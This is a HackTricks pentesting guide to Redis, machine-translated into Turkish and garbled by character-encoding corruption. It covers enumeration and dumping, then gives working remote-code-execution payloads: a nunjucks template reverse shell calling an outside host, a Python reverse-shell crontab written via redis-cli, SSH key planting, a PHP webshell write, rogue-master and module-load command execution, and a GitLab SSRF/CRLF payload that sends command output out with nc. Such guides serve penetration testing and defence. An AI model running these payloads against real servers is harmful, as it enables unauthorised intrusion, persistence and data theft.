# 6379 - Redis Pentesting

<details>

<summary><strong>AWS hackleme becerilerini sÄ±fÄ±rdan ileri seviyeye Ã¶ÄŸrenmek iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>'Ä± Ã¶ÄŸrenin!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'Ä± takip edin**.
* **Hacking hilelerinizi paylaÅŸarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR gÃ¶ndererek** katkÄ±da bulunun.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve Ã¶dÃ¼l avcÄ±larÄ± ile iletiÅŸim kurmak iÃ§in [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katÄ±lÄ±n!

**Hacking Ä°Ã§gÃ¶rÃ¼leri**\
Hacking'in heyecanÄ±nÄ± ve zorluklarÄ±nÄ± ele alan iÃ§eriklerle etkileÅŸime geÃ§in

**GerÃ§ek ZamanlÄ± Hack Haberleri**\
HÄ±zlÄ± tempolu hacking dÃ¼nyasÄ±nÄ± gerÃ§ek zamanlÄ± haberler ve iÃ§gÃ¶rÃ¼lerle takip edin

**En Son Duyurular**\
Yeni Ã¶dÃ¼l avcÄ±larÄ±nÄ±n baÅŸlatÄ±ldÄ±ÄŸÄ± ve Ã¶nemli platform gÃ¼ncellemelerinin olduÄŸu duyurularla bilgilenin

**Bize katÄ±lÄ±n** [**Discord**](https://discord.com/invite/N3FrSbmwdy) ve bugÃ¼n en iyi hackerlarla iÅŸbirliÄŸi yapmaya baÅŸlayÄ±n!

## Temel Bilgiler

[Belgelerden](https://redis.io/topics/introduction) alÄ±nan bilgilere gÃ¶re, Redis, aÃ§Ä±k kaynaklÄ± (BSD lisanslÄ±), bellekte **veri yapÄ±sÄ± deposu** olarak kullanÄ±lan bir **veritabanÄ±**, Ã¶nbellek ve mesaj aracÄ±dÄ±r.

Redis varsayÄ±lan olarak dÃ¼z metin tabanlÄ± bir protokol kullanÄ±r, ancak **ssl/tls** de uygulayabileceÄŸinizi unutmamanÄ±z gerekmektedir. Redis'i [buradan ssl/tls ile Ã§alÄ±ÅŸtÄ±rmayÄ± Ã¶ÄŸrenin](https://fossies.org/linux/redis/TLS.md).

**VarsayÄ±lan port:** 6379
```
PORT     STATE SERVICE  VERSION
6379/tcp open  redis   Redis key-value store 4.0.9
```
## Otomatik NumaralandÄ±rma

Bir Redis Ã¶rneÄŸinden bilgi elde etmeye yardÄ±mcÄ± olabilecek bazÄ± otomatik araÃ§lar:
```bash
nmap --script redis-info -sV -p 6379 <IP>
msf> use auxiliary/scanner/redis/redis_server
```
## El ile SÄ±ralama

### Banner

Redis, bir **metin tabanlÄ± protokol** olduÄŸundan, komutu bir sokete gÃ¶ndererek dÃ¶nen deÄŸerleri okuyabilirsiniz. AyrÄ±ca Redis'in **ssl/tls** kullanarak Ã§alÄ±ÅŸabilmesini de unutmayÄ±n (ancak bu Ã§ok garip bir durumdur).

Normal bir Redis Ã¶rneÄŸinde, `nc` kullanarak baÄŸlantÄ± kurabilir veya `redis-cli`yi de kullanabilirsiniz:
```bash
nc -vn 10.10.10.10 6379
redis-cli -h 10.10.10.10 # sudo apt-get install redis-tools
```
**Ä°lk komut** deneyebileceÄŸiniz ÅŸey **`info`**. Bu, Redis Ã¶rneÄŸiyle ilgili bilgileri dÃ¶ndÃ¼rebilir veya aÅŸaÄŸÄ±daki gibi bir Ã§Ä±ktÄ± dÃ¶nebilir:
```
-NOAUTH Authentication required.
```
Bu son durumda, Redis Ã¶rneÄŸine eriÅŸmek iÃ§in **geÃ§erli kimlik bilgilerine ihtiyacÄ±nÄ±z** olduÄŸu anlamÄ±na gelir.

### Redis Kimlik DoÄŸrulama

Redis **varsayÄ±lan olarak** kimlik bilgisi olmadan eriÅŸilebilir. Bununla birlikte, yalnÄ±zca ÅŸifre veya kullanÄ±cÄ± adÄ± + ÅŸifre desteÄŸi saÄŸlamak iÃ§in **yapÄ±landÄ±rÄ±labilir**.\
`redis.conf` dosyasÄ±nda `requirepass` parametresiyle **bir ÅŸifre belirlenebilir** veya hizmet yeniden baÅŸlatÄ±lana kadar geÃ§ici olarak baÄŸlanarak `config set requirepass p@ss$12E45` komutunu Ã§alÄ±ÅŸtÄ±rabilirsiniz.\
AyrÄ±ca, `redis.conf` dosyasÄ±ndaki `masteruser` parametresiyle bir **kullanÄ±cÄ± adÄ±** yapÄ±landÄ±rÄ±labilir.

{% hint style="info" %}
YalnÄ±zca ÅŸifre yapÄ±landÄ±rÄ±ldÄ±ÄŸÄ±nda kullanÄ±lan kullanÄ±cÄ± adÄ± "**default**" olarak ayarlanÄ±r.\
AyrÄ±ca, Redis'in yalnÄ±zca ÅŸifre veya kullanÄ±cÄ± adÄ± + ÅŸifre ile yapÄ±landÄ±rÄ±lÄ±p yapÄ±landÄ±rÄ±lmadÄ±ÄŸÄ±nÄ± **harici olarak bulmanÄ±n bir yolu yoktur**.
{% endhint %}

Bu gibi durumlarda, Redis ile etkileÅŸimde bulunmak iÃ§in **geÃ§erli kimlik bilgilerini bulmanÄ±z gerekecektir**, bu nedenle [**brute-force**](../generic-methodologies-and-resources/brute-force.md#redis) yÃ¶ntemini deneyebilirsiniz.\
**GeÃ§erli kimlik bilgilerini bulduÄŸunuzda, baÄŸlantÄ±yÄ± kurduktan sonra oturumu doÄŸrulamak iÃ§in aÅŸaÄŸÄ±daki komutu kullanmanÄ±z gerekmektedir:**
```bash
AUTH <username> <password>
```
**GeÃ§erli kimlik bilgileri** `+OK` yanÄ±tÄ±yla karÅŸÄ±lanÄ±r.

### **Kimlik doÄŸrulamasÄ± yapÄ±lmÄ±ÅŸ numaralandÄ±rma**

EÄŸer Redis sunucusu **anonim baÄŸlantÄ±lara** izin veriyorsa veya geÃ§erli kimlik bilgilerine sahipseniz, aÅŸaÄŸÄ±daki **komutlarÄ±** kullanarak hizmetin numaralandÄ±rma sÃ¼recini baÅŸlatabilirsiniz:
```bash
INFO
[ ... Redis response with info ... ]
client list
[ ... Redis response with connected clients ... ]
CONFIG GET *
[ ... Get config ... ]
```
**DiÄŸer Redis komutlarÄ±** [**burada bulunabilir**](https://redis.io/topics/data-types-intro) **ve** [**burada**](https://lzone.de/cheat-sheet/Redis)**.**

UnutmayÄ±n ki bir Ã¶rneÄŸin **Redis komutlarÄ± yeniden adlandÄ±rÄ±labilir** veya _redis.conf_ dosyasÄ±ndan kaldÄ±rÄ±labilir. Ã–rneÄŸin, bu satÄ±r FLUSHDB komutunu kaldÄ±racaktÄ±r:
```
rename-command FLUSHDB ""
```
Redis servisini gÃ¼venli bir ÅŸekilde yapÄ±landÄ±rma hakkÄ±nda daha fazla bilgi iÃ§in buraya bakabilirsiniz: [https://www.digitalocean.com/community/tutorials/how-to-install-and-secure-redis-on-ubuntu-18-04](https://www.digitalocean.com/community/tutorials/how-to-install-and-secure-redis-on-ubuntu-18-04)

AyrÄ±ca, Redis komutlarÄ±nÄ±n gerÃ§ek zamanlÄ± olarak izlenebileceÄŸi **`monitor`** komutuyla veya en yavaÅŸ **25 sorgunun** alÄ±nabileceÄŸi **`slowlog get 25`** komutuyla izleme yapabilirsiniz.

Daha fazla Redis komutu hakkÄ±nda ilginÃ§ bilgileri burada bulabilirsiniz: [https://lzone.de/cheat-sheet/Redis](https://lzone.de/cheat-sheet/Redis)

### **VeritabanÄ± DÃ¶kÃ¼mÃ¼**

Redis iÃ§inde **veritabanlarÄ± 0'dan baÅŸlayan sayÄ±larla** temsil edilir. "Keyspace" bÃ¶lÃ¼mÃ¼nde `info` komutunun Ã§Ä±ktÄ±sÄ±nda kullanÄ±lan herhangi bir veritabanÄ±nÄ± bulabilirsiniz:

![](<../.gitbook/assets/image (315).png>)

Veya sadece tÃ¼m **keyspace'leri** (veritabanlarÄ±nÄ±) alabilirsiniz:
```
INFO keyspace
```
O Ã¶rnekte **0 ve 1 numaralÄ± veritabanlarÄ±** kullanÄ±lÄ±yor. **0 numaralÄ± veritabanÄ± 4 anahtar iÃ§erirken, 1 numaralÄ± veritabanÄ± 1 anahtar iÃ§erir**. Redis varsayÄ±lan olarak 0 numaralÄ± veritabanÄ±nÄ± kullanÄ±r. Ã–rneÄŸin 1 numaralÄ± veritabanÄ±nÄ± dÃ¶kÃ¼mlemek iÃ§in ÅŸunlarÄ± yapmanÄ±z gerekmektedir:
```bash
SELECT 1
[ ... Indicate the database ... ]
KEYS *
[ ... Get Keys ... ]
GET <KEY>
[ ... Get Key ... ]
```
EÄŸer `GET <KEY>` komutunu Ã§alÄ±ÅŸtÄ±rÄ±rken `-WRONGTYPE Operation against a key holding the wrong kind of value` hatasÄ±nÄ± alÄ±rsanÄ±z, anahtarÄ±n bir dize veya tamsayÄ± olmaktan baÅŸka bir ÅŸey olabileceÄŸini ve onu gÃ¶rÃ¼ntÃ¼lemek iÃ§in Ã¶zel bir operatÃ¶re ihtiyaÃ§ duyduÄŸunu gÃ¶sterir.

AnahtarÄ±n tÃ¼rÃ¼nÃ¼ Ã¶ÄŸrenmek iÃ§in `TYPE` komutunu kullanÄ±n, aÅŸaÄŸÄ±da liste ve hash anahtarlarÄ± iÃ§in Ã¶rnek verilmiÅŸtir.
```
TYPE <KEY>
[ ... Type of the Key ... ]
LRANGE <KEY> 0 -1
[ ... Get list items ... ]
HGET <KEY> <FIELD>
[ ... Get hash item ... ]
```
**npm ile veritabanÄ±nÄ± dÃ¶kÃ¼n** [**redis-dump**](https://www.npmjs.com/package/redis-dump) **veya python ile** [**redis-utils**](https://pypi.org/project/redis-utils/)

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve Ã¶dÃ¼l avcÄ±larÄ± ile iletiÅŸim kurmak iÃ§in [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katÄ±lÄ±n!

**Hacking Ä°Ã§gÃ¶rÃ¼leri**\
Hacking'in heyecanÄ±nÄ± ve zorluklarÄ±nÄ± inceleyen iÃ§eriklere katÄ±lÄ±n

**GerÃ§ek ZamanlÄ± Hack Haberleri**\
HÄ±zlÄ± tempolu hacking dÃ¼nyasÄ±nÄ± gerÃ§ek zamanlÄ± haberler ve iÃ§gÃ¶rÃ¼lerle takip edin

**En Son Duyurular**\
Yeni Ã¶dÃ¼l avcÄ±lÄ±klarÄ±nÄ± ve Ã¶nemli platform gÃ¼ncellemelerini takip edin

BugÃ¼n [**Discord**](https://discord.com/invite/N3FrSbmwdy)'a katÄ±lÄ±n ve en iyi hackerlarla iÅŸbirliÄŸi yapmaya baÅŸlayÄ±n!

## Redis RCE

### EtkileÅŸimli Kabuk

[**redis-rogue-server**](https://github.com/n0b0dyCN/redis-rogue-server), Redis(<=5.0.5) Ã¼zerinde otomatik olarak etkileÅŸimli bir kabuk veya ters kabuk alabilir.
```
./redis-rogue-server.py --rhost <TARGET_IP> --lhost <ACCACKER_IP>
```
### PHP Webshell

[**Buradan**](https://web.archive.org/web/20191201022931/http://reverse-tcp.xyz/pentest/database/2017/02/09/Redis-Hacking-Tips.html) bilgi alÄ±n. Web sitesi klasÃ¶rÃ¼nÃ¼n **yolunu** bilmelisiniz:
```
root@Urahara:~# redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /usr/share/nginx/html
OK
10.85.0.52:6379> config set dbfilename redis.php
OK
10.85.0.52:6379> set test "<?php phpinfo(); ?>"
OK
10.85.0.52:6379> save
OK
```
### Åablon Webshell

Ã–nceki bÃ¶lÃ¼mde olduÄŸu gibi, bir ÅŸablon motoru tarafÄ±ndan yorumlanacak olan bazÄ± html ÅŸablon dosyalarÄ±nÄ± Ã¼zerine yazarak bir kabuk elde edebilirsiniz.

Ã–rneÄŸin, [**bu yazÄ±da**](https://www.neteye-blog.com/2022/05/cyber-apocalypse-ctf-2022-red-island-writeup/) gÃ¶rebileceÄŸiniz gibi, saldÄ±rgan **nunjucks ÅŸablon motoru tarafÄ±ndan yorumlanan bir html iÃ§ine bir ters kabuk enjekte etmiÅŸtir:**
```javascript
{{ ({}).constructor.constructor(
"var net = global.process.mainModule.require('net'),
cp = global.process.mainModule.require('child_process'),
sh = cp.spawn('sh', []);
var client = new net.Socket();
client.connect(1234, 'my-server.com', function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});"
)()}}
```
{% hint style="warning" %}
Not edin ki **birkaÃ§ ÅŸablon motoru Ã¶nbelleÄŸe alÄ±r** ÅŸablonlarÄ± **bellekte**, bu yÃ¼zden onlarÄ± Ã¼zerine yazsanÄ±z bile, yeni olan **Ã§alÄ±ÅŸtÄ±rÄ±lmaz**. Bu durumlarda, ya geliÅŸtirici otomatik yeniden yÃ¼kleme iÅŸlemini etkin bÄ±raktÄ± ya da hizmet Ã¼zerinde bir DoS yapmanÄ±z gerekiyor (ve otomatik olarak yeniden baÅŸlatÄ±lmasÄ±nÄ± bekliyorsunuz).
{% endhint %}

### SSH

Ã–rnek [buradan](https://blog.adithyanak.com/oscp-preparation-guide/enumeration)

LÃ¼tfen **`config get dir`** sonucunun diÄŸer manuel saldÄ±rÄ± komutlarÄ±ndan sonra deÄŸiÅŸebileceÄŸinin farkÄ±nda olun. Redis'e giriÅŸ yaptÄ±ktan hemen sonra bunu Ã§alÄ±ÅŸtÄ±rmanÄ±zÄ± Ã¶neririm. **`config get dir`** Ã§Ä±ktÄ±sÄ±nda, **redis kullanÄ±cÄ±sÄ±nÄ±n ev dizinini** (genellikle _/var/lib/redis_ veya _/home/redis/.ssh_) bulabilir ve bunu bildiÄŸinizde, `authenticated_users` dosyasÄ±nÄ± yazabileceÄŸiniz yeri ve **redis kullanÄ±cÄ±sÄ±yla** ssh Ã¼zerinden eriÅŸebileceÄŸiniz yeri bilirsiniz. Yazma izinlerine sahip olduÄŸunuz baÅŸka geÃ§erli bir kullanÄ±cÄ±nÄ±n ev dizinini de biliyorsanÄ±z, onu da kÃ¶tÃ¼ye kullanabilirsiniz:

1. BilgisayarÄ±nÄ±zda bir ssh genel-Ã¶zel anahtar Ã§ifti oluÅŸturun: **`ssh-keygen -t rsa`**
2. Genel anahtarÄ± bir dosyaya yazÄ±n: **`(echo -e "\n\n"; cat ~/id_rsa.pub; echo -e "\n\n") > spaced_key.txt`**
3. DosyayÄ± redis'e aktarÄ±n: **`cat spaced_key.txt | redis-cli -h 10.85.0.52 -x set ssh_key`**
4. Genel anahtarÄ± redis sunucusundaki **authorized\_keys** dosyasÄ±na kaydedin:

```
root@Urahara:~# redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /var/lib/redis/.ssh
OK
10.85.0.52:6379> config set dbfilename "authorized_keys"
OK
10.85.0.52:6379> save
OK
```
5. Son olarak, Ã¶zel anahtarla **redis sunucusuna ssh** yapabilirsiniz: **ssh -i id\_rsa redis@10.85.0.52**

**Bu teknik burada otomatikleÅŸtirilmiÅŸtir:** [https://github.com/Avinash-acid/Redis-Server-Exploit](https://github.com/Avinash-acid/Redis-Server-Exploit)

### Crontab
```
root@Urahara:~# echo -e "\n\n*/1 * * * * /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.85.0.53\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n"|redis-cli -h 10.85.0.52 -x set 1
OK
root@Urahara:~# redis-cli -h 10.85.0.52 config set dir /var/spool/cron/crontabs/
OK
root@Urahara:~# redis-cli -h 10.85.0.52 config set dbfilename root
OK
root@Urahara:~# redis-cli -h 10.85.0.52 save
OK
```
Son Ã¶rnek Ubuntu iÃ§in, **Centos** iÃ§in yukarÄ±daki komut ÅŸu ÅŸekilde olmalÄ±dÄ±r: `redis-cli -h 10.85.0.52 config set dir /var/spool/cron/`

Bu yÃ¶ntem ayrÄ±ca bitcoin kazanmak iÃ§in de kullanÄ±labilir: [yam](https://www.v2ex.com/t/286981#reply14)

### Redis ModÃ¼lÃ¼ YÃ¼kleme

1. [https://github.com/n0b0dyCN/RedisModules-ExecuteCommand](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand) adresindeki talimatlarÄ± takip ederek **keyfi komutlarÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in bir redis modÃ¼lÃ¼ derleyebilirsiniz**.
2. ArdÄ±ndan, derlenen modÃ¼lÃ¼ **yÃ¼klemek iÃ§in bir yol**a ihtiyacÄ±nÄ±z vardÄ±r.
3. YÃ¼klenen modÃ¼lÃ¼ Ã§alÄ±ÅŸma zamanÄ±nda `MODULE LOAD /path/to/mymodule.so` komutuyla **yÃ¼kleyin**.
4. DoÄŸru bir ÅŸekilde yÃ¼klendiÄŸini kontrol etmek iÃ§in **yÃ¼klenen modÃ¼lleri listele**mek iÃ§in `MODULE LIST` komutunu kullanÄ±n.
5. **KomutlarÄ±** **Ã§alÄ±ÅŸtÄ±rÄ±n**:

```
127.0.0.1:6379> system.exec "id"
"uid=0(root) gid=0(root) groups=0(root)\n"
127.0.0.1:6379> system.exec "whoami"
"root\n"
127.0.0.1:6379> system.rev 127.0.0.1 9999
```
6. Ä°stediÄŸiniz zaman modÃ¼lÃ¼ kaldÄ±rÄ±n: `MODULE UNLOAD mymodule`

### LUA sandbox atlatma

[**Burada**](https://www.agarri.fr/blog/archives/2014/09/11/trying\_to\_hack\_redis\_via\_http\_requests/index.html) Redis'in **Lua kodunu sandbox** iÃ§inde Ã§alÄ±ÅŸtÄ±rmak iÃ§in **EVAL** komutunu kullandÄ±ÄŸÄ±nÄ± gÃ¶rebilirsiniz. BaÄŸlantÄ±lÄ± gÃ¶nderide **dofile** fonksiyonunu kullanarak bunu **kÃ¶tÃ¼ye kullanmanÄ±n** nasÄ±l olduÄŸunu gÃ¶rebilirsiniz, ancak [gÃ¶rÃ¼nÃ¼ÅŸe gÃ¶re](https://stackoverflow.com/questions/43502696/redis-cli-code-execution-using-eval) artÄ±k mÃ¼mkÃ¼n deÄŸil. Neyse ki, Lua sandbox'Ä± atlatÄ±rsanÄ±z sistemde **keyfi komutlar** Ã§alÄ±ÅŸtÄ±rabilirsiniz. AyrÄ±ca, aynÄ± gÃ¶nderide DoS'a neden olacak bazÄ± **seÃ§enekler** de bulunmaktadÄ±r.

LUA'dan kaÃ§mak iÃ§in bazÄ± **CVE'ler**:

* [https://github.com/aodsec/CVE-2022-0543](https://github.com/aodsec/CVE-2022-0543)

### Master-Slave ModÃ¼lÃ¼

Ana redis tÃ¼m iÅŸlemler otomatik olarak slave redis'e senkronize edilir, bu da zafiyetli redis'i kendi kontrolÃ¼mÃ¼zdeki ana redis'e baÄŸlÄ± bir slave redis olarak gÃ¶rebileceÄŸimiz anlamÄ±na gelir, bÃ¶ylece kendi redis'imize komut girebiliriz.
```
master redis : 10.85.0.51 (Hacker's Server)
slave  redis : 10.85.0.52 (Target Vulnerability Server)
A master-slave connection will be established from the slave redis and the master redis:
redis-cli -h 10.85.0.52 -p 6379
slaveof 10.85.0.51 6379
Then you can login to the master redis to control the slave redis:
redis-cli -h 10.85.0.51 -p 6379
set mykey hello
set mykey2 helloworld
```
## Redis'e SSRF ile KonuÅŸma

EÄŸer Redis'e **aÃ§Ä±k metin** istek gÃ¶nderebilirseniz, Redis ile **iletiÅŸim kurabilirsiniz** Ã§Ã¼nkÃ¼ Redis isteÄŸi satÄ±r satÄ±r okur ve anlamadÄ±ÄŸÄ± satÄ±rlara sadece hatalarla yanÄ±t verir:
```
-ERR wrong number of arguments for 'get' command
-ERR unknown command 'Host:'
-ERR unknown command 'Accept:'
-ERR unknown command 'Accept-Encoding:'
-ERR unknown command 'Via:'
-ERR unknown command 'Cache-Control:'
-ERR unknown command 'Connection:'
```
Bu nedenle, bir web sitesinde bir **SSRF zafiyeti** bulursanÄ±z ve bazÄ± **baÅŸlÄ±klarÄ±** (belki de bir CRLF zafiyeti ile) veya **POST parametrelerini** **kontrol edebilirseniz**, Redis'e keyfi komutlar gÃ¶nderebilirsiniz.

### Ã–rnek: Gitlab SSRF + CRLF ile Shell

**Gitlab11.4.7** sÃ¼rÃ¼mÃ¼nde bir **SSRF** zafiyeti ve bir **CRLF** keÅŸfedildi. **SSRF** zafiyeti, yeni bir proje oluÅŸtururken **URL'den proje iÃ§e aktarma iÅŸlevselliÄŸinde** bulunuyordu ve \[0:0:0:0:0:ffff:127.0.0.1] formunda keyfi IP'lere eriÅŸime izin veriyordu (bu, 127.0.0.1'e eriÅŸecektir), ve **CRLF** zafiyeti sadece **URL'ye %0D%0A** karakterlerini ekleyerek istismar edildi.

Bu nedenle, bu zafiyetleri **gitlab** tarafÄ±ndan **kuyruklarÄ± yÃ¶neten** Redis Ã¶rneÄŸiyle konuÅŸmak iÃ§in **kÃ¶tÃ¼ye kullanmak mÃ¼mkÃ¼n oldu** ve bu kuyruklarÄ± **kod yÃ¼rÃ¼tme elde etmek** iÃ§in kÃ¶tÃ¼ye kullanmak mÃ¼mkÃ¼ndÃ¼. Redis kuyruk kÃ¶tÃ¼ye kullanÄ±mÄ± yÃ¼kÃ¼:
```
multi
sadd resque:gitlab:queues system_hook_push
lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|whoami | nc 192.241.233.143 80\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
exec
```
Ve **SSRF'yi** istismar etmek iÃ§in **URL kodlamasÄ±** isteÄŸi ve `whoami` komutunu Ã§alÄ±ÅŸtÄ±rmak ve Ã§Ä±ktÄ±yÄ± `nc` aracÄ±lÄ±ÄŸÄ±yla geri gÃ¶ndermek iÃ§in **CRLF** kullanarak yapÄ±lan istek:
```
git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system%5Fhook%5Fpush%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem%5Fhook%5Fpush%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class%5Feval%5C%22%2C%5C%22open%28%5C%27%7Ccat%20%2Fflag%20%7C%20nc%20127%2E0%2E0%2E1%202222%5C%27%29%2Eread%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system%5Fhook%5Fpush%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created%5Fat%5C%22%3A1513714403%2E8122594%2C%5C%22enqueued%5Fat%5C%22%3A1513714403%2E8129568%7D%22%0D%0A%20exec%0D%0A%20exec%0D%0A/ssrf123321.git
```
_Bir nedenden dolayÄ± (bu bilginin alÄ±ndÄ±ÄŸÄ±_ [_https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/_](https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/) _adresindeki yazarÄ±n belirttiÄŸi gibi) bu saldÄ±rÄ±, `http` ÅŸemasÄ± yerine `git` ÅŸemasÄ±yla Ã§alÄ±ÅŸtÄ±._

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve Ã¶dÃ¼l avcÄ±larÄ±yla iletiÅŸim kurmak iÃ§in [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katÄ±lÄ±n!

**Hacking Ä°Ã§gÃ¶rÃ¼leri**\
Hacking'in heyecanÄ±nÄ± ve zorluklarÄ±nÄ± ele alan iÃ§eriklerle etkileÅŸime geÃ§in.

**GerÃ§ek ZamanlÄ± Hack Haberleri**\
HÄ±zlÄ± tempolu hacking dÃ¼nyasÄ±nÄ± gerÃ§ek zamanlÄ± haberler ve iÃ§gÃ¶rÃ¼lerle takip edin.

**En Son Duyurular**\
Yeni Ã¶dÃ¼l avlarÄ± ve Ã¶nemli platform gÃ¼ncellemeleri hakkÄ±nda bilgi sahibi olun.

**Bize** [**Discord**](https://discord.com/invite/N3FrSbmwdy) **katÄ±lÄ±n ve bugÃ¼n en iyi hackerlarla iÅŸbirliÄŸi yapmaya baÅŸlayÄ±n!**

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hacklemeyi Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklam vermek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>
